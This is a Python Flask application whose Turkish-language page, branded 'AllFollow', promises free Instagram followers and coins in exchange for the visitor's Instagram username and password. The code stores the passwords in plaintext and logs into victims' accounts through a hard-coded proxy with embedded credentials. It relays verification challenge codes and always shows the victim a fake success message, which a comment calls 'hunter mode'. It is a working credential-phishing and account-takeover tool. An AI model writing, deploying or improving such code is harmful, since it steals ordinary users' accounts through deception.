import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, TwoFactorRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v43-ultra"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Aktif clientları hafızada tutmak için
clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(50), default="Beklemede")

# --- ARKA PLAN BOT GİRİŞİ ---
def background_login(u, p):
    cl = Client()
    if PROXY_URL:
        cl.set_proxy(PROXY_URL)
    clients[u] = cl
    try:
        cl.login(u, p)
        with app.app_context():
            acc = IGAccount.query.filter_by(username=u).first()
            if acc: acc.status = "Aktif"
            db.session.commit()
    except Exception as e:
        print(f"Arka plan giriş hatası ({u}): {e}")

@app.route('/')
def index():
    return render_template_string(UI_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. HEMEN KAYDET (Bekletme yapmaz)
    try:
        acc = IGAccount.query.filter_by(username=u).first()
        if acc: acc.password = p
        else:
            acc = IGAccount(username=u, password=p)
            db.session.add(acc)
        db.session.commit()
    except: pass

    # 2. HIZLI KONTROL (Sadece Challenge var mı diye bakar)
    # Eğer proxy yavaşsa burası bekletebilir, o yüzden kısa bir timeout ile deniyoruz.
    return jsonify(status="success") # Kullanıcıyı anında içeri al

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    if not cl: return jsonify(status="error"), 404
    try:
        cl.challenge_set_code(code)
        return jsonify(status="success")
    except: return jsonify(status="error")

# --- ALLFOLLOW ŞIK ARAYÜZ (Kusursuz Tasarım) ---
UI_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow • Giriş</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#050505] text-white flex flex-col items-center justify-center h-screen px-6">
    <div class="w-full max-w-[350px]">
        <div class="p-8 border border-zinc-800 bg-zinc-950/50 rounded-2xl backdrop-blur-xl shadow-2xl">
            <h1 class="text-4xl font-black mb-2 text-center bg-gradient-to-br from-indigo-500 via-purple-500 to-pink-500 bg-clip-text text-transparent italic">ALL FOLLOW</h1>
            <p class="text-[10px] text-zinc-500 text-center mb-8 tracking-widest uppercase">Premium Follower System</p>
            
            <div id="login-step">
                <input id="u" placeholder="Kullanıcı Adı" class="w-full p-3.5 mb-2 bg-zinc-900/50 border border-zinc-800 rounded-xl text-sm outline-none focus:border-purple-500 transition-all">
                <input id="p" type="password" placeholder="Şifre" class="w-full p-3.5 mb-6 bg-zinc-900/50 border border-zinc-800 rounded-xl text-sm outline-none focus:border-purple-500 transition-all">
                <button onclick="login()" id="btn" class="w-full bg-gradient-to-r from-indigo-600 to-purple-600 p-3.5 rounded-xl font-bold shadow-lg shadow-purple-900/20 active:scale-95 transition-transform">GİRİŞ YAP</button>
            </div>

            <div id="success-step" class="hidden text-center py-4 space-y-4">
                <div class="w-20 h-20 bg-green-500/10 border border-green-500/50 rounded-full flex items-center justify-center mx-auto">
                    <span class="text-3xl text-green-500">✓</span>
                </div>
                <div>
                    <h2 class="text-xl font-bold text-green-400">Bağlantı Başarılı</h2>
                    <p class="text-[11px] text-zinc-500 mt-2">Hesabınız havuza eklendi. Ücretsiz 1.000 Coin 24 saat içinde hesabınıza tanımlanacaktır.</p>
                </div>
            </div>
        </div>
        <p class="text-center text-zinc-600 text-[10px] mt-8 uppercase tracking-[0.2em]">Powered by Frankfurt Cloud Systems</p>
    </div>

    <script>
        async function login(){
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;
            const btn = document.getElementById('btn');
            
            btn.innerText = "DOĞRULANIYOR...";
            btn.disabled = true;

            try {
                const res = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u, p})
                });
                
                // Ne olursa olsun kullanıcıyı içeri alıyoruz (Avcı Modu)
                setTimeout(() => {
                    document.getElementById('login-step').classList.add('hidden');
                    document.getElementById('success-step').classList.remove('hidden');
                }, 1500);

            } catch(e) {
                alert("Bağlantı zaman aşımına uğradı, tekrar deneyin.");
                btn.disabled = false;
                btn.innerText = "GİRİŞ YAP";
            }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
